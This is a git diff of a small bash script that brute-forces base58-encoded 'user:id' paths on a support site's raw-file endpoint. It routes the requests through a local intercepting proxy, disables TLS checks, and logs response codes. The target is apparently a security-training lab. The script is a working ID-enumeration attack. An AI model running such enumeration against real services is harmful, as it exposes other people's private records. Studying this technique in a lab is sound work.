@@ -6,7 +6,7 @@ split_input() {
 	local body=$(echo $response| sed 's/{.*}//')	
 	local json=$(echo $response| sed 's/.*{/{/')
 	local response_code=$(echo $json| jq '.response_code')
-	echo "number = $i,code = $response_code"
+	echo "number = $i,code = $response_code, file= $file"
 	#echo $body
 	#echo $json
 	if [ $response_code -eq "200" ]
@@ -17,12 +17,15 @@ split_input() {
 }
 
 
-for i in $(seq 1 $2)
+for i in $(seq 3800 3900)
 do
 	#file=$(echo -n "$i:1"| base58)
 	file=$(echo -n "$1:$i"| base58)
 	response=$(curl -s --proxy http://127.0.0.1:8080 -k -i "https://support.quoccabank.com/raw/$file" --write-out '%{json}')
-	split_input $response $i
-	sleep 0.2
+	split_input $response $i $file
+	sleep 0.1
 done
 
+#file=$(echo -n "1125:3837"| base58)
+#response=$(curl -s --proxy http://127.0.0.1:8080 -k -i "https://support.quoccabank.com/raw/$file" --write-out '%{json}')
+#split_input $response $i
